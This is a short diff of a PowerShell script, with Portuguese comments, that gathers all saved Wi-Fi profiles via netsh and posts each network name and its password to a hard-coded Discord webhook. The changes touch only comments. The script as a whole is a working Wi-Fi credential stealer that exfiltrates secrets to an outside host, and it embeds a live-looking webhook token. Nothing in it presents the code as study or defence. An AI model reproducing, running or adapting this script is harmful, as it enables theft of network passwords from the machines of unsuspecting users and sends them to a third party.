@@ -1,5 +1,6 @@
 $Webhook="https://discord.com/api/webhooks/1391925819017793566/P6u2qHAbmqSFeu94T1beCpyWBO6khVVdCK66sy8a083xDZqRSyY5w5PDHDciVnh2ImDB"
 
+# Obter perfis Wi-Fi
 $profiles = netsh wlan show profile | Where-Object { $_ -match "All User Profile" } | ForEach-Object { ($_ -split ':')[1].Trim() }
 
 foreach ($p in $profiles) {
@@ -10,5 +11,5 @@ foreach ($p in $profiles) {
     $message = "📶 **Rede:** $p | **Senha:** `$password`"
     $json = @{content = $message} | ConvertTo-Json
     Invoke-RestMethod -Uri $Webhook -Method Post -Body $json -ContentType "application/json"
-    Start-Sleep -Milliseconds 300 # Evita rate limiting
+    Start-Sleep -Milliseconds 300
 }
